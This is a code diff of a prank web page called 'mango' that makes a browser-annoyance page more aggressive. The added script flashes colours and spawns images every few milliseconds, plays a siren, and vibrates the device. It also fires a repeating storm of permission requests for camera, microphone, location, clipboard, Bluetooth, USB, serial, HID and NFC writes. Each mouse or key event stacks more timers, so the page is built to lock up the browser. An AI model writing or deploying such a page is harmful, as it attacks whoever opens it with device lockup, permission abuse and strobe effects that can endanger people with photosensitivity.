@@ -1,46 +1,60 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>mango</title>
 <meta property="og:type" content="website">
 <meta property="og:title" content="mango">
 <meta property="og:description" content="mango">
-<meta property="og:url" content="https://SEU-LINK-AQUI">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mango">
-<meta name="twitter:description" content="mango">
+<meta property="og:url" content="https://YOUR-LINK-HERE">
 <link id="icon" rel="icon">
 <style>
 html,body{
-margin:0;
-padding:0;
-width:100%;
-height:100%;
-background:white;
-overflow:hidden;
-font-family:sans-serif;
+  margin:0;
+  padding:0;
+  width:100%;
+  height:100%;
+  background:white;
+  overflow:hidden;
+  font-family:sans-serif;
+  touch-action:none;
 }
 .item{
-position:absolute;
-pointer-events:none;
-will-change:transform,opacity;
+  position:absolute;
+  pointer-events:none;
+  will-change:transform,opacity;
 }
-.shake{animation:shake 0.12s infinite;}
+.shake{animation:shake 0.06s infinite;}
 @keyframes shake{
-0%{transform:translate(0,0)}
-25%{transform:translate(6px,6px)}
-50%{transform:translate(-6px,6px)}
-75%{transform:translate(6px,-6px)}
-100%{transform:translate(0,0)}
+  0%{transform:translate(0,0)}
+  25%{transform:translate(10px,10px)}
+  50%{transform:translate(-10px,10px)}
+  75%{transform:translate(10px,-10px)}
+  100%{transform:translate(0,0)}
 }
+#trigger{
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  font-size:200px;
+  pointer-events:all;
+  cursor:pointer;
+  z-index:9999;
+  user-select:none;
+  text-align:center;
+}
+#trigger:hover{ font-size:220px; }
 </style>
 </head>
 <body>
-<audio id="bg" src="https://random.getunx.cc/Assets/2c0e8675dda2864abf408e6202e82ae7.mp3" loop></audio>
+<div id="trigger">🥭<br><small>touch / click me for mango overload</small></div>
+<audio id="bg" src="https://random.getunx.cc/Assets/2c0e8675dda2864abf408e6202e82ae7.mp3" loop preload="auto"></audio>
+<audio id="annoy" src="https://assets.mixkit.co/sfx/preview/mixkit-siren-alert-1003.mp3" loop preload="auto"></audio>
+
 <script>
-const base="https://api-gatostuff.vercel.app/raw/assets/randasset/";
-const imgs=[
+const baseURL = "https://api-gatostuff.vercel.app/raw/assets/randasset/";
+const imageList = [
 "img/01dbc1adc829dc3554cce431b1a8f3a6.jpg",
 "img/0235d48ad3fe45089783ddc92521aee3.jpg",
 "img/10691eb4709bcd5d8d3b17b031787164.jpg",
@@ -109,161 +123,198 @@ const imgs=[
 "img/new/new/new/e6006bf694e6f65bb18f83f24686101f.jpg",
 "img/new/new/new/images (95).jpeg"
 ];
-const messages=[
-"so much aura",
-"tufffff",
-"ifinite aura infinite",
-"🥭🥭🥭",
-"mango moment",
-"iam cumming rn ahh",
-"tuff mango"
-];
 
-function spawn(){
-const isEmoji=Math.random()<0.5;
-let el;
-if(isEmoji){
-el=document.createElement("div");
-el.textContent="🥭";
-el.style.fontSize=(Math.random()*120+24)+"px";
-el.style.opacity=(Math.random()*0.6+0.4).toString();
-}else{
-el=document.createElement("img");
-el.src=base+imgs[Math.floor(Math.random()*imgs.length)];
-el.style.width=(Math.random()*360+40)+"px";
-el.style.opacity=(Math.random()*0.6+0.4).toString();
-el.style.transform=`rotate(${Math.random()*360}deg)`;
-}
-el.className="item";
-el.style.left=Math.random()*(innerWidth-50)+"px";
-el.style.top=Math.random()*(innerHeight-50)+"px";
-document.body.appendChild(el);
-setTimeout(()=>{try{el.remove()}catch(e){}},5500);
+function createEmojiElement(){
+  const d = document.createElement("div");
+  d.textContent = "🥭";
+  d.className = "item";
+  d.style.fontSize = (Math.random()*180 + 30) + "px";
+  d.style.opacity = (Math.random()*0.8+0.2).toString();
+  d.style.left = Math.random()*(innerWidth-100) + "px";
+  d.style.top = Math.random()*(innerHeight-100) + "px";
+  d.style.transform = `rotate(${Math.random()*720-360}deg)`;
+  return d;
 }
 
-function alertSpam(){
-alert(""+messages[Math.floor(Math.random()*messages.length)]);
+function createImageElement(){
+  const img = document.createElement("img");
+  img.className = "item";
+  img.src = baseURL + imageList[Math.floor(Math.random()*imageList.length)];
+  img.style.width = (Math.random()*500 + 80) + "px";
+  img.style.opacity = (Math.random()*0.8+0.2).toString();
+  img.style.left = Math.random()*(innerWidth-120) + "px";
+  img.style.top = Math.random()*(innerHeight-120) + "px";
+  img.style.transform = `rotate(${Math.random()*720-360}deg)`;
+  return img;
 }
 
-function confirmSpam(){
-confirm(""+messages[Math.floor(Math.random()*messages.length)]);
+function spawnVisual(){
+  const el = Math.random() < 0.6 ? createEmojiElement() : createImageElement();
+  document.body.appendChild(el);
+  setTimeout(()=>{ try{ el.remove() }catch(e){} }, 4000);
 }
 
-function promptSpam(){
-prompt("": "+messages[Math.floor(Math.random()*messages.length)]);
-}
-
+const babyEmojis = ["👶","👶🏻","👶🏼","👶🏽","👶🏾","👶🏿"];
 function titleSpam(){
-document.title=messages[Math.floor(Math.random()*messages.length)];
+  const type = Math.random();
+  if (type < 0.4) {
+    let str = "";
+    for (let i = 0; i < 20 + Math.floor(Math.random()*30); i++) {
+      str += babyEmojis[Math.floor(Math.random()*babyEmojis.length)];
+    }
+    document.title = str;
+  } else if (type < 0.8) {
+    document.title = "🥭".repeat(15 + Math.floor(Math.random()*30));
+  } else {
+    let str = "";
+    for (let i = 0; i < 40 + Math.floor(Math.random()*60); i++) {
+      str += Math.random() < 0.5 ? "I" : "l";
+    }
+    document.title = str;
+  }
 }
 
 function faviconSpam(){
-const c=document.createElement("canvas");
-c.width=c.height=32;
-const ctx=c.getContext("2d");
-ctx.clearRect(0,0,32,32);
-ctx.font="24px serif";
-ctx.fillText("🥭",0,26);
-document.getElementById("icon").href=c.toDataURL();
+  const c = document.createElement("canvas");
+  c.width = c.height = 32;
+  const ctx = c.getContext("2d");
+  ctx.clearRect(0,0,32,32);
+  ctx.font = "28px serif";
+  ctx.fillText("🥭", 2, 28);
+  document.getElementById("icon").href = c.toDataURL();
 }
 
-function flash(){
-document.body.style.background = Math.random()<0.5 ? "#fff" : "#eee";
+const colors = ["#fff","#eee","#ffdd99","#ffaa00","#ff6600","#ffff00","#ff8800"];
+function flashBackground(){
+  document.body.style.background = colors[Math.floor(Math.random()*colors.length)];
 }
 
-function addShake(){
+function vibratePattern(){
+  if(navigator.vibrate) navigator.vibrate([60,20,60,20,60,20,60]);
+}
+
+function tryFocus(){ try{ window.focus(); }catch(e){} }
+
+function mangoNotificationSpam() {
+  if (Notification.permission === "granted") {
+    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = canvas.height = 128;
+      const ctx = canvas.getContext("2d");
+      ctx.font = "100px serif";
+      ctx.fillText("🥭", 10, 100);
+      const iconUrl = canvas.toDataURL();
+      new Notification("🥭", { body: "🥭", icon: iconUrl });
+    } catch(e) {}
+  }
+}
+
+let midiAccess = null;
+async function requestMIDIAccess() {
+  if (navigator.requestMIDIAccess) {
+    try { midiAccess = await navigator.requestMIDIAccess(); } catch(e) {}
+  }
+}
+function ultraMIDISpam() {
+  if (!midiAccess || midiAccess.outputs.size === 0) return;
+  const outputs = Array.from(midiAccess.outputs.values());
+  outputs.forEach(output => {
+    for (let i = 0; i < 16; i++) {
+      const ch = Math.floor(Math.random() * 16);
+      const note = 20 + Math.floor(Math.random() * 80);
+      const vel = 100 + Math.floor(Math.random() * 28);
+      output.send([0x90 + ch, note, vel]);
+      setTimeout(() => output.send([0x80 + ch, note, 0]), 15 + Math.random() * 40);
+    }
+  });
+}
+
+async function tryNFC() {
+  if ("NDEFReader" in window) {
+    try {
+      const ndef = new NDEFReader();
+      await ndef.scan();
+      setInterval(async () => {
+        try { await ndef.write("🥭"); } catch(e) {}
+      }, 1200);
+    } catch(e) {}
+  }
+}
+
+async function chainedPermissionStorm() {
+  let delay = 0;
+  const step = 200;
+
+  setTimeout(() => { if ("Notification" in window) Notification.requestPermission().catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(async () => { await requestMIDIAccess(); }, delay);
+  delay += step;
+  setTimeout(() => { if (navigator.mediaDevices?.getUserMedia) navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s => s.getTracks().forEach(t=>t.stop())).catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { if (navigator.clipboard) { navigator.clipboard.writeText("🥭".repeat(100)).catch(()=>{}); navigator.clipboard.readText().catch(()=>{}); } }, delay);
+  delay += step;
+  setTimeout(() => { if ("wakeLock" in navigator) navigator.wakeLock.request('screen').catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { document.documentElement.requestFullscreen?.().catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { document.body.requestPointerLock?.(); }, delay);
+  delay += step;
+  setTimeout(() => { tryNFC(); }, delay);
+  delay += step;
+  setTimeout(() => { navigator.bluetooth?.requestDevice({acceptAllDevices:true}).catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { navigator.usb?.requestDevice({filters:[]}).catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { navigator.serial?.requestPort().catch(()=>{}); }, delay);
+  delay += step;
+  setTimeout(() => { navigator.hid?.requestDevice({filters:[]}).catch(()=>{}); }, delay);
+}
+
+const bgAudio = document.getElementById("bg");
+const annoyAudio = document.getElementById("annoy");
+function tryPlayAudio() {
+  bgAudio.play().catch(()=>{});
+  annoyAudio.play().catch(()=>{});
+  bgAudio.volume = annoyAudio.volume = 0.8 + Math.random()*0.2;
+  bgAudio.playbackRate = annoyAudio.playbackRate = 0.9 + Math.random()*0.6;
+}
+
 document.body.classList.add("shake");
-}
+setInterval(spawnVisual, 60);
+setInterval(titleSpam, 60);
+setInterval(faviconSpam, 80);
+setInterval(flashBackground, 40);
 
-function tryNotifications(){
-Notification.requestPermission().then(p=>{
-if(p==="granted"){
-const n = new Notification("Site diz: "+messages[Math.floor(Math.random()*messages.length)]);
-}
+const events = ["click","touchstart","touchmove","mousedown","keydown","scroll","wheel","mousemove"];
+events.forEach(evt => {
+  document.addEventListener(evt, () => {
+    chainedPermissionStorm();
+    tryPlayAudio();
+    ultraMIDISpam();
+    mangoNotificationSpam();
+
+    const trigger = document.getElementById("trigger");
+    if (trigger) trigger.remove();
+
+    setInterval(spawnVisual, 12);
+    setInterval(vibratePattern, 150);
+    setInterval(tryFocus, 200);
+    setInterval(mangoNotificationSpam, 300);
+    setInterval(ultraMIDISpam, 100);
+  }, {passive: false});
 });
-}
 
-function tryClipboard(){
-if(navigator.clipboard){
-navigator.clipboard.writeText("🥭").catch(()=>{});
-navigator.clipboard.readText().then(()=>{}).catch(()=>{});
-}
-}
+setInterval(mangoNotificationSpam, 300);
+setInterval(ultraMIDISpam, 100);
+setInterval(tryPlayAudio, 600);
+setInterval(titleSpam, 40);
+setInterval(chainedPermissionStorm, 1500);
 
-function tryGeo(){
-if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{});
-}
+chainedPermissionStorm();
+tryPlayAudio();
 
-function tryCameraMic(){
-if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s=>{
-s.getTracks().forEach(t=>t.stop());
-}).catch(()=>{});
-}
-}
-
-function tryMidi(){
-if(navigator.requestMIDIAccess) navigator.requestMIDIAccess().catch(()=>{});
-}
-
-function tryBluetooth(){
-if(navigator.bluetooth && navigator.bluetooth.requestDevice) navigator.bluetooth.requestDevice({acceptAllDevices:true}).catch(()=>{});
-}
-
-function tryUSB(){
-if(navigator.usb && navigator.usb.requestDevice) navigator.usb.requestDevice({filters:[]}).catch(()=>{});
-}
-
-function trySerial(){
-if(navigator.serial && navigator.serial.requestPort) navigator.serial.requestPort().catch(()=>{});
-}
-
-function tryHID(){
-if(navigator.hid && navigator.hid.requestDevice) navigator.hid.requestDevice({filters:[]}).catch(()=>{});
-}
-
-function tryPointerLock(){
-if(document.body.requestPointerLock) document.body.requestPointerLock();
-}
-
-function tryFullscreen(){
-if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(()=>{});
-}
-
-function permissionSpam(){
-tryNotifications();
-tryClipboard();
-tryGeo();
-tryCameraMic();
-tryMidi();
-tryBluetooth();
-tryUSB();
-trySerial();
-tryHID();
-tryPointerLock();
-tryFullscreen();
-}
-
-function startAll(){
-addShake();
-setInterval(spawn,10);
-setInterval(alertSpam,1500);
-setInterval(confirmSpam,3000);
-setInterval(promptSpam,4500);
-setInterval(titleSpam,100);
-setInterval(faviconSpam,220);
-setInterval(flash,160);
-setInterval(()=>{if(Notification.permission==="granted"){new Notification("Site diz: "+messages[Math.floor(Math.random()*messages.length)])}},1200);
-permissionSpam();
-setInterval(permissionSpam,8000);
-setInterval(tryClipboard,7000);
-}
-
-const audio=document.getElementById("bg");
-audio.loop=true;
-audio.play().then(startAll).catch(()=>{
-document.addEventListener("click",()=>audio.play().then(startAll),{once:true});
-});
 </script>
 </body>
 </html>
